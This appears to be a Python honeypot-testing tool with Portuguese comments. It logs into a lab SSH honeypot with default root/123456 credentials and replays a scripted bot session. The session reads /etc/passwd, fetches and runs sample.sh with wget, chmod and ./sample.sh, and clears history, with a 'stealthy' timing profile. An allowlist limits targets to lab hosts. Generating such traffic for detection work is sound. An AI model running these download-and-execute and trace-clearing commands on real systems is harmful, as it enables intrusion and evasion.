#!/usr/bin/env python3
"""Bot de pós-login: simula a sequência inofensiva de comandos de um bot SSH contra o honeypot."""

import argparse
import random
import sys
import time
from dataclasses import dataclass
from typing import Callable

import paramiko

from allowlist import TargetNotAllowedError, require_allowed_target

FILESERVER_PORT = 8000
READ_IDLE_SECONDS = 0.6
CONNECT_TIMEOUT_SECONDS = 10

NOISY_DELAY_RANGE = (0.2, 1.0)
STEALTHY_DELAY_RANGE = (3.0, 8.0)
NOISY_EXTRA_REPEATS = (0, 2)
RECON_COMMANDS_TO_REPEAT = ("ls -la", "whoami")

EXIT_OK = 0
EXIT_FAILURE = 1
EXIT_REFUSED = 2


@dataclass(frozen=True)
class Step:
    command: str
    delay: float  # espera, em segundos, antes de executar o comando


def build_plan(profile: str, rng: random.Random, fileserver: str) -> list[Step]:
    """Monta a sequência de comandos de uma sessão; é determinística para o mesmo `rng`."""
    download = f"wget http://{fileserver}:{FILESERVER_PORT}/sample.sh"
    if profile == "noisy":
        recon = ["uname -a", "cat /proc/cpuinfo", "whoami", "cat /etc/passwd", "ls -la"]
        for _ in range(rng.randint(*NOISY_EXTRA_REPEATS)):
            recon.insert(rng.randint(0, len(recon)), rng.choice(RECON_COMMANDS_TO_REPEAT))
        commands = [*recon, download, "chmod +x sample.sh", "./sample.sh", "history -c"]
        delay_range = NOISY_DELAY_RANGE
    elif profile == "stealthy":
        commands = ["whoami", "uname -a", "cat /etc/passwd", download, "chmod +x sample.sh",
                    "./sample.sh", "history -c"]
        delay_range = STEALTHY_DELAY_RANGE
    else:
        raise ValueError(f"perfil desconhecido: {profile}")
    return [Step(command, round(rng.uniform(*delay_range), 2)) for command in commands]


def read_available(channel, idle: float = READ_IDLE_SECONDS) -> str:
    """Lê a saída do shell até ficar `idle` segundos sem receber dados."""
    chunks: list[str] = []
    last_data = time.monotonic()
    while time.monotonic() - last_data < idle:
        if channel.recv_ready():
            chunks.append(channel.recv(4096).decode("utf-8", errors="replace"))
            last_data = time.monotonic()
        else:
            time.sleep(0.05)
    return "".join(chunks)


def run_session(client, plan: list[Step], sleep: Callable[[float], None] = time.sleep) -> list[str]:
    """Abre um shell interativo e executa o plano; devolve a saída de cada comando."""
    channel = client.invoke_shell()
    outputs = [read_available(channel)]  # banner/prompt inicial
    for step in plan:
        sleep(step.delay)
        channel.send(step.command + "\n")
        outputs.append(read_available(channel))
    channel.close()
    return outputs


def connect(host: str, port: int, user: str, password: str) -> paramiko.SSHClient:
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(host, port=port, username=user, password=password,
                   timeout=CONNECT_TIMEOUT_SECONDS, allow_agent=False, look_for_keys=False)
    return client


def parse_args(argv: list[str]) -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description="Executa sessões SSH pós-login com comandos inofensivos contra o honeypot.")
    parser.add_argument("--target", required=True, help="hostname do honeypot (lista branca)")
    parser.add_argument("--port", type=int, default=2222)
    parser.add_argument("--user", default="root")
    parser.add_argument("--password", default="123456")
    parser.add_argument("--fileserver", default="lab-fileserver",
                        help="hostname que serve o sample.sh (lista branca)")
    parser.add_argument("--sessions", type=int, default=1, help="número de sessões")
    parser.add_argument("--interval", type=float, default=2.0,
                        help="segundos entre sessões")
    parser.add_argument("--profile", choices=["noisy", "stealthy"], default="noisy")
    parser.add_argument("--seed", type=int, default=None, help="semente para reprodutibilidade")
    args = parser.parse_args(argv)
    if args.sessions < 1:
        parser.error("--sessions deve ser >= 1")
    if args.interval < 0:
        parser.error("--interval não pode ser negativo")
    return args


def main(argv: list[str] | None = None) -> int:
    args = parse_args(sys.argv[1:] if argv is None else argv)
    try:
        require_allowed_target(args.target)
        require_allowed_target(args.fileserver)
    except TargetNotAllowedError as error:
        print(f"ERRO: {error}", file=sys.stderr)
        return EXIT_REFUSED

    rng = random.Random(args.seed)
    for number in range(1, args.sessions + 1):
        plan = build_plan(args.profile, rng, args.fileserver)
        print(f"Sessão {number}/{args.sessions} ({args.profile}): {len(plan)} comandos")
        try:
            client = connect(args.target, args.port, args.user, args.password)
        except (paramiko.SSHException, OSError) as error:
            print(f"ERRO: falha ao conectar em {args.target}:{args.port}: {error}", file=sys.stderr)
            return EXIT_FAILURE
        try:
            run_session(client, plan)
        finally:
            client.close()
        if number < args.sessions:
            time.sleep(args.interval)
    return EXIT_OK


if __name__ == "__main__":
    sys.exit(main())
